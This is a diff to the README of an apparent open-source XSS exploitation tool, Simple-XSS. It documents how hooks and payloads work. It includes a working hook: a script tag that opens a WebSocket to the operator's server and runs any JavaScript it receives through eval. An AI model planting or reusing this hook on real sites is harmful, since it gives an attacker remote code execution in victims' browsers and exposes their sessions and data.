@@ -10,10 +10,32 @@ Simple-XSS is a multiplatform XSS vulnerability exploiter.
 
 > _Hooks folder: [hooks](hooks)_
 
+
+**Hook** is an HTML code that can be embedded in a vulnerable XSS form. It looks like:
+
+```html
+
+<script>c = new WebSocket('{{environment.public_url}}');c.onmessage = (e) => eval(e.data);</script>
+```
+
+This is a [default](hooks/default) hook. When it's embedded in the vulnerable form, it downloads the JS
+code ([payload](#payload)) via
+WebSockets
+protocol from the server and
+executes it using [eval](https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Global_Objects/eval).
+
 ### Payload
 
 > _Payloads folder: [payloads](payloads)_
 
+**Payload** is a JS code that loaded by hook on a vulnerable page and executed
+with [eval](https://developer.mozilla.org/ru/docs/Web/JavaScript/Reference/Global_Objects/eval).
+
+### Internal Objects
+
+#### Environment
+
+#### Metadata
 
 Firstly you need to choose hook:
 
